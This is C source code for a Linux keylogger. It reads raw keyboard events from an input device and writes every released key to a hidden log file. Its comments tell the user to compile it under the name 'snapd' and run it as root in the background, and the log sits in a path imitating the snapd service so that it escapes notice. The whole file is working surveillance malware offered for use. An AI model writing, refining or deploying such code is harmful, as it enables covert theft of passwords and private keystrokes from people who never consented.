// gcc simple_keylogger.c -o snapd.c
// sudo ./snapd.c & 
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>

// make sure the path exists
#define LOGFILE "/root/.snapd/snap-store/common/.snapd.log" 

int main(int argc, char **argv)
{
    struct input_event ev;
    // get the correct input device
    // ls -l /dev/input/by-id
    int fd = open("/dev/input/event4", O_RDONLY);
    FILE *fp = fopen(LOGFILE, "a");
    char *map = "..1234567890-=..qwertyuiop....asdfghjkl.....zxcvbnm,.-";

    while (1)
    {
        read(fd, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 0)
        {
            fflush(fp);
            switch (ev.code)
            // key event codes
            // cat /usr/include/linux/input-event-codes.h
            {
            // ENTER
            case 28:
                fprintf(fp, "\n");
                break;
            // TAB
            case 15:
                fprintf(fp, "\n");
                break;
            // SPACE
            case 57:
                fprintf(fp, " ");
                break;
            case 42:
                fprintf(fp, "<SHIFT>");
                break;
            case 54:
                fprintf(fp, "<SHIFT>");
                break;
            case 29:
                fprintf(fp, "<CTRL>");
                break;
            case 56:
                fprintf(fp, "<ALT>");
                break;
            case 105:
                fprintf(fp, "<LEFT>");
                break;
            case 106:
                fprintf(fp, "<RIGHT>");
                break;
            case 103:
                fprintf(fp, "<UP>");
                break;
            case 108:
                fprintf(fp, "<DOWN>");
                break;
            default:
                fprintf(fp, "%c", map[ev.code]);
            }
        }
    }
    fclose(fp);
    close(fd);
}